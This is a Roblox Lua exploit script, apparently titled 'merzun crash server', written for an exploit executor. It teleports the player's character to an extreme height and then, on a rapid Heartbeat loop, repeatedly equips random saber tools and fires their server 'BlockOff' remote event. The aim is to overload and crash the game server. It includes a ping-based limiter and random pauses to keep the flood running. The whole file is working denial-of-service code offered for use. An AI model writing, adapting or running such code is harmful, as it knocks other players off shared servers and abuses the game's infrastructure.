-- merzun crash server
-- entropy rememberance

-- debug values --

local crashspeed = 72
local amountofrepeat = 5
local orgamount = amountofrepeat
local useanticrash = true
local usediagnostic = true
local repeatdiagnostic = true
local uselimiter = true

-- dont change below --

-- FUNCTIONS

local function delta(func, rr)
    rr = (1000 / rr) * 0.001;
    local acc = 0;
    game:GetService("RunService").Heartbeat:Connect(function(Delta)
        acc = acc + Delta;
        if acc >= rr then
            acc = acc - rr;
            func();
        end;
    end);
    return {
        r = function(int)
            rr = (1000/int) * 0.001;
        end;
    };
end;


--- initialize

local LocalPlayer = game.Players.LocalPlayer
local prints = {}
if crashspeed > 200 then
crashspeed = 200
end
rconsoleprint("CrashSpeed loaded is: "..crashspeed.."\n")

local wai = 150
local used = false
local count = 0
local sabers = {}
sabers = LocalPlayer.Backpack:GetChildren()
for i,v in pairs(sabers) do
    if v.ClassName ~= "Tool" then
    table.remove(sabers,i)
    end
end
rconsoleprint("Sabers loaded are:\n")
wait(1)
for i,v in pairs(sabers) do
rconsoleprint(i..": "..v.Name.."\n")
end
chare = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
chare.HumanoidRootPart.CFrame = CFrame.new(0,9*(10^8),0)
wait(4)
local orgtime = os.time()
delta(function()
    e = 0
    chare = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
chare.HumanoidRootPart.CFrame = CFrame.new(0,9*(10^8),0)
    if uselimiter == true then
    if math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()) > 100000 then
    amountofrepeat = 3
    else
        amountofrepeat = orgamount
    end
    end
    repeat
    game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):EquipTool(sabers[math.random(1, #sabers)])
    sabers[math.random(1, #sabers)].Action:FireServer("BlockOff")
    e = e + 1
    count = count + 1
    until e == amountofrepeat
    if orgtime + 1 < os.time() and used == false and usediagnostic == true then
    rconsoleprint('SOO/Speed of Operations: '..(count).."\n")
    rconsoleprint('Ping of server is: '..math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()).."ms\n")
    count = 0
    if repeatdiagnostic == false then
    used = true
    else
        orgtime = os.time()
        used = false
    end
    end
   wai = wai - 1
  if wai <= 0 then
        if useanticrash == true then
    wait(math.random(2.25,3.25))
    wai = 150
    end
    end
end, crashspeed)
